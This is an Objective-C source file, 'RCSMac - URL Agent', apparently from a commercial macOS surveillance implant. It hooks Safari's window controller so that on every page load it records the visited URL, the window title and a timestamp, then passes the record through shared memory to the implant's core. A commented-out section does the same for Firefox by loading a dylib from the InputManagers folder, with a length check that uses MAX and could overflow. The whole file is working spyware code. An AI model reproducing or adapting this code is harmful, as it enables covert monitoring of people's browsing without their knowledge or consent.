/*
 * RCSMac - URL Agent
 *
 *
 * Created by Alfredo 'revenge' Pesoli on 13/05/2009
 *  Modified by Massimo Chiodini on 05/08/2009
 *
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import <objc/objc-class.h>
//#import <dlfcn.h>

#import "RCSMInputManager.h"
#import "RCSMAgentURL.h"
#import "RCSMCommon.h"

//#define DEBUG

#define BROWSER_UNKNOWN      0x00000000
#define BROWSER_SAFARI       0x00000004
#define BROWSER_MOZILLA      0x00000002
#define BROWSER_TYPE_MASK    0x3FFFFFFF

static NSDate   *gURLDate = nil;
static NSString *gPrevURL = nil;

@interface myLoggingObject : NSObject

- (void)logURL: (NSString *)URL;

@end

@implementation myLoggingObject

- (void)logURL: (NSString *)URL
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  NSTimeInterval interval;
  
  if (URL == nil)
    return;
    
  if (gURLDate == nil)
    {
      gURLDate = [[NSDate date] retain];
#ifdef DEBUG
      NSLog(@"first gURLDate: %@", gURLDate);
#endif
    }
  
  interval = [[NSDate date] timeIntervalSinceDate: gURLDate];
#ifdef DEBUG
  NSLog(@"interval : %f", interval);
#endif
  
  NSString *tempUrl1 = [URL stringByReplacingOccurrencesOfString: @"http://"
                                                      withString: @""];
  NSString *tempUrl2 = [URL stringByReplacingOccurrencesOfString: @"http://www."
                                                      withString: @""];
  NSString *tempUrl3 = [URL stringByReplacingOccurrencesOfString: @"www."
                                                      withString: @""];
#ifdef DEBUG_VERBOSE
  NSLog(@"tempURL1: %@", tempUrl1);
  NSLog(@"tempURL2: %@", tempUrl2);
  NSLog(@"tempURL3: %@", tempUrl3);
#endif
  
  //
  // if
  // - gPrevURL equals current URL
  // - elapsed seconds since last url log >= 5 sec
  // then avoid logging
  //
  if (gPrevURL != nil
      && ([gPrevURL isEqualToString: URL]
          || [gPrevURL isEqualToString: tempUrl1]
          || [gPrevURL isEqualToString: tempUrl2]
          || [gPrevURL isEqualToString: tempUrl3])
      && interval <= (double)5)
    {
#ifdef DEBUG
      NSLog(@"URL already logged <= 5 seconds ago");
#endif
      return;
    }
  
  if (gPrevURL != nil)
    [gPrevURL release];
  
  gPrevURL = [URL copy];
  
  [gURLDate release];
  gURLDate = [[NSDate date] retain];
  
#ifdef DEBUG
  NSLog(@"%s URL: %@", __FUNCTION__, URL);
  NSLog(@"Sleeping for grabbing the correct window title");
#endif
  
  // In order to avoid grabbing a wrong window title
  // was 80k
  usleep(300000);
  
  NSDictionary  *windowInfo;
  NSString      *_windowName;
  NSMutableData *windowName;
  
  NSString *_empty            = @"EMPTY";
  //NSURL *_url                 = [[self _locationFieldURL] copy];
  NSData *url = [URL dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
  
  NSMutableData *logData    = [[NSMutableData alloc] initWithLength: sizeof(shMemoryLog)];
  NSMutableData *entryData  = [[NSMutableData alloc] init];
  
  shMemoryLog *shMemoryHeader = (shMemoryLog *)[logData bytes];
  short unicodeNullTerminator = 0x0000;
  
  time_t rawtime;
  struct tm *tmTemp;
  
  // Struct tm
  time (&rawtime);
  tmTemp             = gmtime(&rawtime);
  tmTemp->tm_year   += 1900;
  tmTemp->tm_mon    ++;
  
  //
  // Our struct is 0x8 bytes bigger than the one declared on win32
  // this is just a quick fix
  // 0x14 bytes for 64bit processes
  //
  if (sizeof(long) == 4) // 32bit
    {
      [entryData appendBytes: (const void *)tmTemp
                      length: sizeof (struct tm) - 0x8];
    }
  else if (sizeof(long) == 8) // 64bit
    {
      [entryData appendBytes: (const void *)tmTemp
                      length: sizeof (struct tm) - 0x14];
    }
  
  u_int32_t logVersion = 0x20100713;
  
  // Log Marker/Version (retrocompatibility)
  [entryData appendBytes: &logVersion
                  length: sizeof(logVersion)];
#ifdef DEBUG
  NSLog(@"entryData: %@", entryData);
#endif
  // URL Name
  [entryData appendData: url];
  
  //char singleNullTerminator = '\0';
  
  // Null terminator
  [entryData appendBytes: &unicodeNullTerminator
                  length: sizeof(short)];
  
  // Browser Type
  int browserType = BROWSER_SAFARI;
  
  [entryData appendBytes: &browserType
                  length: sizeof(browserType)];
  
  // Window Name
  if ((windowInfo = getActiveWindowInformationForPID(getpid())) == nil)
    {
#ifdef DEBUG
      NSLog(@"%s No windowInfo found", __FUNCTION__);
#endif
      [entryData appendData: [_empty dataUsingEncoding: NSUTF16LittleEndianStringEncoding]];
    }
  else
    {
      if ([[windowInfo objectForKey: @"windowName"] length] == 0)
        {
#ifdef DEBUG
          NSLog(@"%s windowName is empty", __FUNCTION__);
          NSLog(@"%s processName %@", __FUNCTION__, [windowInfo objectForKey: @"processName"]);
#endif
          [entryData appendData: [_empty dataUsingEncoding: NSUTF16LittleEndianStringEncoding]];
        }
      else
        {
          _windowName = [[windowInfo objectForKey: @"windowName"] copy];
          
#ifdef DEBUG
          NSLog(@"%s windowName: %@", __FUNCTION__, _windowName);
#endif
          windowName = [[NSMutableData alloc] initWithData:
                        [_windowName dataUsingEncoding:
                         NSUTF16LittleEndianStringEncoding]];
          
          [entryData appendData: windowName];
          [windowName release];
          [_windowName release];
        }
    }
  
  // Null terminator
  [entryData appendBytes: &unicodeNullTerminator
                  length: sizeof(short)];
  
  // Delimiter
  unsigned int del = LOG_DELIMITER;
  [entryData appendBytes: &del
                  length: sizeof(del)];
  
#ifdef DEBUG
  NSLog(@"entryData final: %@", entryData);
#endif
  
  // Log buffer
  shMemoryHeader->status          = SHMEM_WRITTEN;
  shMemoryHeader->agentID         = AGENT_URL;
  shMemoryHeader->direction       = D_TO_CORE;
  shMemoryHeader->commandType     = CM_LOG_DATA;
  shMemoryHeader->flag            = 0;
  shMemoryHeader->commandDataSize = [entryData length];
  
  memcpy(shMemoryHeader->commandData,
         [entryData bytes],
         [entryData length]);
  
  //NSLog(@"logData: %@", logData);
  
  if ([mSharedMemoryLogging writeMemory: logData 
                                 offset: 0
                          fromComponent: COMP_AGENT] == TRUE)
    {
#ifdef DEBUG
      NSLog(@"URL logged correctly");
#endif
    }
  else
    {
#ifdef DEBUG_ERRORS
      NSLog(@"Error while logging url to shared memory");
#endif
    }
  
  [logData release];
  [entryData release];
  [outerPool drain];
}

@end

@implementation myBrowserWindowController

- (void)webFrameLoadCommittedHook: (id)arg1
{
  [self webFrameLoadCommittedHook: arg1];
  
#ifdef DEBUG
  NSLog(@"%s", __FUNCTION__);
#endif

  NSString *_url              = [[self performSelector: @selector(_locationFieldText)] copy];
  myLoggingObject *logObject = [[myLoggingObject alloc] init];
  
  [NSThread detachNewThreadSelector: @selector(logURL:)
                           toTarget: logObject
                         withObject: _url];
  
  [logObject release];
  [_url release];
}

@end

/*
@implementation NSTextField (safariHook)

- (void)textDidEndEditingHook: (NSNotification *)aNotification
{
  [self textDidEndEditingHook: (aNotification)];
#ifdef DEBUG
  NSLog(@"Delegate: %@", [self delegate]);
#endif
  NSURL *_url = [[self delegate] _locationFieldURL];
  NSString *url = [_url absoluteString];
  NSData *logData = [[NSMutableData alloc] initWithLength: sizeof(shMemoryLog)];
  
  shMemoryLog *shMemoryHeader = (shMemoryLog *)[logData bytes];
  shMemoryHeader->agentID = AGENT_URL;
  shMemoryHeader->direction = D_TO_CORE;

  shMemoryHeader->commandDataSize = [url lengthOfBytesUsingEncoding: NSUTF8StringEncoding];
  strncpy(shMemoryHeader->commandData, [url UTF8String] , shMemoryHeader->commandDataSize);
#ifdef DEBUG
  NSLog(@"logData: %@", logData);
#endif

  if ([mSharedMemoryLogging writeMemory: logData
                                 offset: OFFT_URL
                          fromComponent: COMP_AGENT] == TRUE)
    {
#ifdef DEBUG
      NSLog(@"Logged: %@", url);
#endif
    }
  else
    NSLog(@"Error while logging url to shared memory");
  
  [logData release];
  
  //if ([[self delegate] _locationFieldTextIsLocationFieldURL] == YES)
}

@end

typedef char* get_url_t(); 

@implementation NSWindow (firefoxHook)

- (void)setTitleHook:(NSString *)title
{
  get_url_t* get_url;
  
  [self setTitleHook: (title)];
  
#ifdef DEBUG
  NSLog(@"firefox setTitle: '%@'", title);
#endif
  
  void * ffurllib = dlopen("/Library/InputManagers/RCSMInputManager/RCSMInputManager.bundle/Contents/MacOS/libffurl.dylib", RTLD_LAZY);
  
  if(ffurllib == 0)
    {
#ifdef DEBUG
      NSLog(@"Cannot loading ffurl.dylib: <%s>", dlerror());
#endif
      return;
    }
  
  get_url = (get_url_t*) dlsym(ffurllib, "get_url");
  
  if(get_url == 0)
    {
#ifdef DEBUG      
      NSLog(@"Cannot get get_url function");
#endif      
      return;
    }
  
  char* ff_url = get_url();

  if(ff_url == NULL)
    {
#ifdef DEBUG      
      NSLog(@"Cannot get _url");
#endif      
      return;
    }

#ifdef DEBUG
  NSLog(@"firefox url: %s", ff_url);
#endif
  
  NSData *logData = [[NSMutableData alloc] initWithLength: sizeof(shMemoryLog)];
  
  shMemoryLog *shMemoryHeader = (shMemoryLog *)[logData bytes];
  shMemoryHeader->agentID = AGENT_URL;
  shMemoryHeader->direction = D_TO_CORE;
  shMemoryHeader->commandDataSize = MAX(strlen(ff_url), MAX_COMMAND_DATA_SIZE);
  strncpy(shMemoryHeader->commandData, ff_url , shMemoryHeader->commandDataSize);
  
  if ([mSharedMemoryLogging writeMemory: logData 
                                 offset: OFFT_URL 
                          fromComponent: COMP_AGENT] == TRUE)
    {
#ifdef DEBUG
      NSLog(@"Firefox Logged!");
#endif
    }
  else
#ifdef DEBUG
    NSLog(@"Error while logging url to shared memory");
#endif
  
  [logData release]; 
  
}

@end
*/
